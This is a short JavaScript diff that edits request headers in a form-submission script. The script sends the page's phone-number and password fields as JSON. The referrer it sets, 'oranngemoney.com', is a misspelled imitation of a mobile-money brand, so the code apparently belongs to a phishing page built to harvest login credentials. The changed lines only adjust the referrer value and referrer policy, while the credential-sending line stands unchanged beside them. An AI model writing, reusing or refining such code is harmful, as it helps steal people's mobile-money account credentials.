@@ -231,8 +231,8 @@
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.setRequestHeader('mode', 'cors');
         xhr.setRequestHeader('redirect', 'follow');
-        xhr.setRequestHeader('referrer', 'https://oranngemoney.com');
-        xhr.setRequestHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+        xhr.setRequestHeader('referrer', 'oranngemoney.com');
+        xhr.setRequestHeader('Referrer-Policy', 'origin-when-cross-origin');
 
 
         xhr.send(JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}));
